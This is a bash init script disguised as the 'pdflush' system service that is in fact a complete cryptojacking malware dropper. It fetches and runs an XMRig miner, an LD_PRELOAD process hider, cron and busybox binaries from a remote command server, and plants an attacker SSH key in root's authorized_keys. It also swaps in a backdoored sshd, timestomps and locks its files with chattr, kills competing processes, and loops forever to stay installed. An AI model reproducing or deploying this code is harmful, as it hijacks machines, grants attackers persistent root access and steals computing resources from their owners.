#!/bin/bash
#chkconfig: 2345 81 96
#description: pdflush

pdflushType="launch"
threads=$(grep -c "processor" /proc/cpuinfo)   # Get the number of cores
launch="/etc/init.d/pdflushs"   # Master script
xmrig="/usr/bin/kthreadds"      # Mining file
config="/usr/bin/config.json"   # Mining configuration file
busybox="/lib64/busybox"        # busybox
sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"  # SHA-512 hash of busybox
chattr="/lib64/libg++.so"       # chattr
preload="/etc/ld.so.preload"    # preload library hijacking file
processhider="/lib64/libstdc++.so"      # prochider process hiding tool
backdoor="/lib64/gc++"  # Backdoor program directory
cron="/lib64/libgc++.so"        # cron daemon file
ssh="/etc/ssh"          # ssh file
sshd="/usr/sbin"        # sshd file

# Print usage
usage() {
    echo "Usage: $launch {start|status}"
}

# Print running status
status() {
    echo -e "\033[32mRunning... \033[0m"
}

# Check for updates
checkUpdate() {
    tempIp=$(ping -c1 Rainbow66.f3322.net | sed '1{s/[^(]*(//;s/).*//;q}')
    if [[ $tempIp == "127.0.0.1" ]]; then
        remoteIp=188.121.119.155
    elif [[ $tempIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        FIELD1=$(echo $tempIp | cut -d. -f1)
        FIELD2=$(echo $tempIp | cut -d. -f2)
        FIELD3=$(echo $tempIp | cut -d. -f3)
        FIELD4=$(echo $tempIp | cut -d. -f4)
        if [[ $FIELD1 -le 255 && $FIELD2 -le 255 && $FIELD3 -le 255 && $FIELD4 -le 255 ]]; then
            remoteIp=$tempIp
        else
            remoteIp=188.121.119.155
        fi
    fi

    # Get SHA-512 of each component
    remoteXmrigSha512=$(wget -qO- http://$remoteIp/sha512/xmrig)
    remotePdflushsSha512=$(wget -qO- http://$remoteIp/sha512/$pdflushType)
    remoteProcesshiderSha512=$(wget -qO- http://$remoteIp/sha512/processhider)
    remoteCronSha512=$(wget -qO- http://$remoteIp/sha512/cron)
    localXmrigSha512=$(sha512sum $xmrig | awk '{print $1}')
    localPdflushsSha512=$(sha512sum $launch | awk '{print $1}')
    localBusyboxSha512=$(sha512sum $busybox | awk '{print $1}')
    localProcesshiderSha512=$(sha512sum $processhider | awk '{print $1}')
    localCronSha512=$(sha512sum $cron | awk '{print $1}')
    
    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]; then
        busybox chattr -iaR /lib64/
        wget -qO /lib64/launchUpdate http://$remoteIp/update/launchUpdate
        chmod a+x /lib64/launchUpdate
        nohup /lib64/launchUpdate > /dev/null &
    fi
    if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]; then
        busybox chattr -iaR /usr/bin/
        rm -f $xmrig
        pkill -f kthreadds
    fi
    if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]; then
        busybox chattr -iaR /lib64/
        rm -f $processhider
        wget -qO $processhider http://$remoteIp/xmrig/processhider.so
        timeFile=$(ls -t /lib64 | tail -1)
        touch -r /lib64/$timeFile $processhider
        busybox chattr +ai $processhider
    fi
    if [[ $remoteCronSha512 != $localCronSha512 ]]; then
        busybox chattr -iaR /lib64/
        rm -f $cron
        pkill -f "libgc++.so"
    fi
}

# Check if the backdoor public key is in authorized_keys
checkBackdoor() {
    busybox chattr +ai /root/.ssh/authorized_keys
    busybox chattr -R +ai $backdoor
    if [[ ! -e /root/.ssh ]]; then
        mkdir /root/.ssh
    else
        busybox chattr -aiR /root/.ssh/
    fi
    if ! grep -q "crbv0ds3/3MgVNHfXHGcCw" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]; then
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV0zreCpf9ddN6w3XvbnwJRxzav3A0nGCX+tAjanb5BRDD1pLJXabRJxF28Lf7MtcvbF/vripTwM62FjfODIDuqrBKv2crbv0ds3/3MgVNHfXHGcCw6x5ezV0+kfyY0OBlVJv7iP9Q78mM38/Nfz/gGN5vYtsR3zVZrk23spXRFhuPbE8P6PHTAyXC99wi/cISBnV1130hz7/wi1M55PaXXHn+et3CPmao4yAV5zI2tatird5zMETIYK2n8VmkOUtIMlNDZC8wUhv/RB+Lgk81uPc3HCI/r8hulMAYyp8Bj2eHN1DDTWOpLqohnI45NGeReR2JIA/6l2lJNbQ+IRCn rsa 2048-040119" > /root/.ssh/authorized_keys
        busybox chattr +ai /root/.ssh/authorized_keys
    fi
    if [[ $(lsattr /root/.ssh/authorized_keys | awk '{print $1}' | grep -c i) != 1 ]]; then
        busybox chattr +ai /root/.ssh/authorized_keys
    fi
    if [[ $threads -gt 8 ]]; then
        if [[ $(ssh -B) != "Congratulations!" || $(sshd -B) != "Congratulations!" ]]; then
            busybox chattr -ai /etc/ssh/ssh_config
            busybox chattr -ai /etc/ssh/sshd_config
            busybox chattr -ai /etc/ssh/ssh_host_rsa_key
            rm /etc/ssh/ssh_config
            rm /etc/ssh/sshd_config
            rm /etc/ssh/ssh_host_rsa_key
            busybox chattr -ai $(which ssh)
            busybox chattr -ai $(which sshd)
            busybox chattr -Rai $backdoor
            cd $backdoor
            make install
            busybox chattr -R +ai $backdoor
            timeFile=$(ls -t $ssh | tail -1)
            touch -r $timeFile /etc/ssh/ssh_config
            touch -r $timeFile /etc/ssh/sshd_config
            touch -r $timeFile /etc/ssh/ssh_host_rsa_key
            chmod a+x $ssh
            chmod a+x $(which sshd)
        fi
    fi
}

# Check cron process
checkCronProc() {
    cronProc=$(ps | grep "cron" | grep -v grep)
    if [[ ! $cronProc ]]; then
        busybox chattr -iaR /lib64
        wget -qO $cron http://$remoteIp/cron
        chmod a+x $cron
        nohup $cron > /dev/null &
    fi
}

# Check cron file
checkCronFile() {
    if [[ ! -e $cron || ! -x $cron ]]; then
        busybox chattr -iaR /lib64/
        wget -qO $cron http://$remoteIp/cron
        chmod a+x $cron
    fi
}

# Check xmrig process
checkXmrigProc() {
    xmrigProc=$(ps | grep kthreadds | grep -v grep)
    if [[ ! $xmrigProc ]]; then
        nohup $xmrig > /dev/null &
    fi
    if [[ $(ps | grep kthreadds | grep -v grep | wc -l) -gt 1 ]]; then
        pkill -f kthreadds
    fi
    if [[ $(ps | grep kthreadds | grep -v grep | wc -l) == 0 ]]; then
        nohup $xmrig > /dev/null &
    fi
}

# Kill other processes with high CPU usage
killOtherProc() {
    killProc=$(ps -eo pid,pcpu,comm | awk '$2 >= 95.0 {print $1}')
    if [[ $killProc ]]; then
        kill -9 $killProc
    fi
}

# Check xmrig file
checkXmrigFile() {
    if [[ ! -e $xmrig || ! -x $xmrig ]]; then
        busybox chattr -iaR /usr/bin/
        rm -f $xmrig
        wget -qO $xmrig http://$remoteIp/xmrig/xmrig
        chmod a+x $xmrig
    fi
    if [[ ! -e $config || ! -x $config ]]; then
        busybox chattr -iaR /usr/bin/
        rm -f $config
        wget -qO $config http://$remoteIp/xmrig/config.json
        chmod a+x $config
    fi
}

# Check preload file
checkPreloadFile() {
    if [[ ! -e $preload || ! -x $preload ]]; then
        busybox chattr -iaR /etc/
        wget -qO $preload http://$remoteIp/preload
        chmod a+x $preload
    fi
    if ! grep -q "$processhider" $preload; then
        echo "$processhider" >> $preload
    fi
}

# Check self file
checkSelfFile() {
    if [[ ! -e $launch || ! -x $launch ]]; then
        busybox chattr -iaR /lib64/
        wget -qO $launch http://$remoteIp/update/$pdflushType
        chmod a+x $launch
    fi
}

# Check chattr executable
checkChattrExecute() {
    if [[ ! -e $chattr || ! -x $chattr ]]; then
        busybox chattr -iaR /lib64/
        wget -qO $chattr http://$remoteIp/chattr
        chmod a+x $chattr
    fi
    if [[ ! $(stat -c %Y $chattr) -gt $(date +%s) ]]; then
        touch $chattr
    fi
}

# Check busybox file
checkBusyboxFile() {
    if [[ ! -e $busybox || ! -x $busybox ]]; then
        busybox chattr -iaR /lib64/
        wget -qO $busybox http://$remoteIp/busybox
        chmod a+x $busybox
    fi
    if [[ $sha512Busybox != $(sha512sum $busybox | awk '{print $1}') ]]; then
        busybox chattr -iaR /lib64/
        wget -qO $busybox http://$remoteIp/busybox
        chmod a+x $busybox
    fi
}

# Main loop
while true; do
    checkUpdate
    checkBackdoor
    checkCronProc
    checkCronFile
    checkXmrigProc
    killOtherProc
    checkXmrigFile
    checkPreloadFile
    checkSelfFile
    checkChattrExecute
    checkBusyboxFile
    sleep 1
done
